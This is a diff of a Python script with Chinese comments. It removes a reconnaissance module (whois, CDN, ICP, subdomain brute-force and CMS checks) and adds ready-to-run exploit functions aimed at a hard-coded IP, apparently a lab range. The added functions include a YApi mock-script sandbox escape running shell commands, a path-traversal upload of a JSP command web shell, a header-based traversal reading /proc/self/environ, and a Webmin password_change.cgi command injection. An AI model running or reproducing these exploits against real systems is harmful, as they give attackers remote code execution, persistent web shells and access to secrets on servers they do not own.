@@ -1,146 +1,127 @@
-import difflib
-import json
-
-import dns.resolver
+import time
 import requests
-from lxml import etree
-from bs4 import BeautifulSoup
-import whois
-from urllib.parse import quote
+from HackRequests import hackRequests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
 
-# 基础信息收集模块
-class FoundationInfo():
-    # 判断是否是CDN   domain：域名
-    def get_cdn(self, domain):
-        data = {
-            'type': 'host',
-            'host': domain,
-            'hfUrl': domain,
-            't': '电信, 联通, 移动'
+# 命令执行有点问题
+def yapi_test(url, email='zhangsan@admin.com', pwd='zhangsan', username='zhangsan', basepath='x', title='j'):
+    regurl = f'{url}/api/user/reg'
+    regdata = {
+        "email": email, "password": pwd, "username": username
+    }
+    reg = requests.post(url=regurl, data=regdata).json()
+    if reg['errmsg'] != '成功！': return '注册失败'
+    loginurl = f'{url}/api/user/login'
+    logindata = {"email": email, "password": pwd}
+    login = requests.session()
+    res = login.post(url=loginurl, data=logindata)
+    create_project_url = f'{url}/api/project/add'
+    for group_id in range(99):
+        create_project_data = {"name": basepath, "basepath": basepath, "group_id": "%2d" % group_id, "icon": "code-o",
+                               "color": "gray",
+                               "project_type": "private"}
+        res = login.post(url=create_project_url, data=create_project_data).json()
+        print(res)
+        if res['errmsg'] == '成功！':
+            project_id = res['data']['_id']
+            print(project_id)
+            print(group_id)
+            add_interface_url = '/api/interface/add'
+            add_interface_data = {"method": "GET", "catid": "965", "title": title, "path": f"/{title}",
+                                  "project_id": project_id}
+            res = login.post(url + add_interface_url, data=add_interface_data).json()
+            interface_id = res['data']['_id']
+            savemock_url = '/api/plugin/advmock/save'
+            savemock_data = {"project_id": project_id, "interface_id": interface_id,
+                             "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"id;uname -a;pwd\").toString()",
+                             "enable": "true"}
+            savemock_res = login.post(url=url + savemock_url, data=savemock_data).json()
+            print(savemock_res)
+            # 无头浏览器点击
+            chrome_options = Options()
+            chrome_options.add_argument('--headless')
+            driver = webdriver.Chrome(executable_path='chromedriver-win64/chromedriver-win64/chromedriver.exe')
+            driver.get(url + '/login')
+            time.sleep(2)
+            driver.find_element_by_id('email').send_keys('zhangsanw@admin.com')
+            driver.find_element_by_id('password').send_keys('zhangsan')
+            driver.find_element_by_tag_name('button').click()
+            driver.get('project_id')
+
+            shell_url = f'/mock/{project_id}/c/d'
+            getshell_res = login.get(url=url + shell_url).text
+            print(getshell_res)
+            break
+
+
+def upload_file():
+    # 要上传的目标URL
+    url = "https://123.58.224.8:23642/fileupload/toolsAny"
+
+    # 文件的内容
+    file_content = """<FORM>
+        <INPUT name='cmd' type=text>
+        <INPUT type=submit value='Run'>
+    </FORM>
+    <%@ page import="java.io.*" %>
+        <%
+        String cmd = request.getParameter("cmd");
+        String output = "";
+        if(cmd != null) {
+            String s = null;
+            try {
+                Process p = Runtime.getRuntime().exec(cmd,null,null);
+                BufferedReader sI = new BufferedReader(new
+    InputStreamReader(p.getInputStream()));
+                while((s = sI.readLine()) != null) { output += s+"</br>"; }
+            }  catch(IOException e) {   e.printStackTrace();   }
         }
-        res = requests.post(url=f'https://cdn.chinaz.com/search/?host={domain}', data=data)
-        res = etree.HTML(res.text)
-        data = res.xpath('/html/body/div[3]/text()')
-        if data[0].find('使用CDN') != -1:
-            return True
-        if data[0].find('不属于CDN云加速') != -1:
-            return True
-        else:
-            return False
+    %>
+            <pre><%=output %></pre>"""
 
-    # 获取whois信息   domain：域名
-    def get_whois(self, domain):
-        res = whois.whois(domain)
-        email = res['emails']
-        return res
+    # 文件名和路径
+    files = {
+        "../../../../repository/deployment/server/webapps/authenticationendpoint/1.jsp": (
+            "1.jsp", file_content, "text/plain")
+    }
 
-    # 获取IPC备案号
-    def get_ipc(self, domain, type):
-        datlist = []
-        # 备案号反查域名
-        if type == 'ipctodomain':
-            res = requests.get(url=f'https://www.beianx.cn/search/{quote(domain)}')
-            soup = BeautifulSoup(res.text, 'html.parser')
-            res = soup.find_all('tr')
-            datlist = []
-            for i in res:
-                finda = i.find_all('a')
-                for a in finda:
-                    if a['href'].find('seo') != -1:
-                        datlist.append(a.text)
+    # 发起POST请求
+    response = requests.post(url, files=files, verify=False)
 
-        else:
-            # 域名查询备案号
-            res = requests.get(url=f'https://www.beianx.cn/search/{domain}')
-            soup = BeautifulSoup(res.text, 'html.parser')
-            datas = soup.find_all(class_='align-middle')
-            dname = datas[1].text.replace('\n', '')
-            datlist.append(dname)
-            xingz = datas[2].text.replace(' ', '').replace('\n', '')
-            datlist.append(xingz)
-            ipc_id = datas[3].text.replace(' ', '').replace('\n', '')
-            datlist.append(ipc_id)
-        return datlist
-
-    # 查询注册人
-    def fancha(self, domain):
-        res = self.get_whois(domain)
-        return str(res['name']).encode('utf-8').decode()
+    # 打印服务器响应
+    print(response.text)
 
 
-class SubdomainExplosion():
-    def __init__(self):
-        self.domain1 = 'asfsdgdfsgfasdfdsdfs'
-        self.domain2 = 'yuiopiuytgvbnmkjhghfghfjb'
+def read_file_vul():
+    url = 'http://123.58.224.8:55682/chybeta'
+    head = {
+        'Accept': '../../../../../../../../proc/self/environ{{'
+    }
+    res = requests.get(url, headers=head).text
+    print(res)
 
-    # 测试泛解析
-    def get_analysis(self, domain):
-        try:
-            dns.resolver.resolve(self.domain1 + domain, rdtype='A')
-            dns.resolver.resolve(self.domain2 + domain, rdtype='A')
-            res1 = requests.get('http://' + self.domain1 + domain)
-            res2 = requests.get('http://' + self.domain2 + domain)
-            check_ana = difflib.SequenceMatcher(None, res1.text, res2.text).quick_ratio()
-            if check_ana >= 0.90:
-                print('存在泛解析')
-            else:
-                res = input('可能存在泛解析，是否继续爆破 Yes No：')
-                if res == 'Yes':
-                    return True
-                else:
-                    return False
-        except:
-            return True
 
-    # 获取IP地址归属
-    def get_ip_address(self, domain):
-        res = requests.get(f'http://ip-api.com/json/{domain}?lang=zh-CN')
-        return res.json()['country']+res.json()['regionName'], res.json()['city']
+def webmin_rce():
+    url = 'https://123.58.224.8:61114/password_change.cgi'
+    headers = {
+    'Accept-Encoding': "gzip, deflate",
+    'Accept': "*/*",
+    'Accept-Language': "en",
+    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
+    'Connection': "close",
+    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
+    'Referer': "https://123.58.224.8:61114/session_login.cgi",
+    'Content-Type': "application/x-www-form-urlencoded",
+    'Content-Length': "60",
+    'cache-control': "no-cache"
+    }
+    data = 'user=rootxx&pam=&expired=2&old=test|pwd&new1=test2&new2=test2'
+    res = requests.post(url=url, data=data,verify=False,headers=headers).text
+    print(res)
 
-    # 子域名爆破
-    def sub_domain(self, domain):
-        is_analysis = self.get_analysis(domain)
-        if is_analysis is True:
-            domain_list = []
-            for sdomain in open('domains.txt', 'r').readlines():
-                sdomain = sdomain.replace('\n', '')
-                try:
-                    query_res = dns.resolver.resolve(sdomain + '.' + domain, rdtype='A')
-                    found = FoundationInfo()
-                    res = found.get_cdn(sdomain + '.' + domain)
-                    if res is True:
-                        print(sdomain + '.' + domain)
-                        domain_list.append(sdomain + '.' + domain)
-                    else:
-                        for query_item in query_res.response.answer:
-                            for item in query_item.items:
-                                ipg = self.get_ip_address(item)
-                                # print(sdomain + '.' + domain+'>>>'+str(item)+'>>>'+ipg)
-                                domain_list.append(sdomain + '.' + domain+'>>>'+str(item)+'>>>'+str(ipg))
-                except:
-                    pass
-            return domain_list
-        else:
-            return '该域名存在泛解析'
-
-    def what_cms(self,domain):
-        zidian  = open('zidian.json','r',encoding='utf-8').read()
-        for i in json.loads(zidian)['cmsdata']:
-            res = requests.get(domain).text
-            print(res)
-            if res.find(i['text']) != -1:
-                print(i['cmsname'])
-
-# found = FoundationInfo()
-# res = found.get_cdn('cip.cc')
-# print(res)
-
-sub = SubdomainExplosion()
-# res = sub.get_ip_address('120.79.199.196')
-res = sub.what_cms('http://120.79.199.196')
-# if type(res) is list:
-#     for i in res:
-#         print(i)
-# else:
-#     print(res)
+# yapi_test('http://123.58.224.8:23243')
+# upload_file()
+# read_file_vul()
+# webmin_rce()
